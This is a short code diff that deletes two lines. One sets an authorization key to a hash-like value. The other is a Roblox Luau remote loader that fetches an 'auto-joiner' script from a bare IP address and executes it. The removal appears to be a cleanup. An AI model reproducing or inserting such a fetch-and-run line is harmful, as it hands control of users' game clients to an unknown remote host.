@@ -1,2 +1,0 @@
-AUTHORIZATION_KEY="$2b$10$uCWp2M8V3V/t9QaTajaXyOStZgtTux/lcMil1WO1aMbhwdHD3tHQy";
-loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/auto-joiner.luau"))()
